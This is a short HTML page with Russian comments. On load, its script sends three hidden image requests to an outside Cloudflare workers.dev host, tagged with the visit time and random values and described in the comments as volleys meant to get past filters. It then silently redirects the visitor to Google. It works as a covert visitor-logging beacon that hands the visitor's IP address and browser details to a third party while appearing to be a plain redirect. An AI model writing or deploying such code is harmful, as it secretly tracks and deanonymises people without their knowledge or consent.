<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
<script>
async function xray() {
    // Собираем данные один раз
    const t = encodeURIComponent(new Date().toLocaleString());
    const rnd = Math.random().toString(36).substring(7);
    const workerUrl = `https://adminfdm.alexgranny1708.workers.dev/?t=${t}&v=${rnd}`;

    const go = () => { window.location.replace("https://google.com"); };

    // Функция "выстрела" пакетом
    const fire = () => {
        const i = new Image();
        i.src = workerUrl + "&attempt=" + Math.random();
    };

    // Серия залпов для пробива фильтров
    fire(); 
    setTimeout(fire, 500);
    setTimeout(fire, 1000);

    // Финальный редирект с запасом времени
    setTimeout(go, 2500);
}

xray();
</script>
</body>
</html>
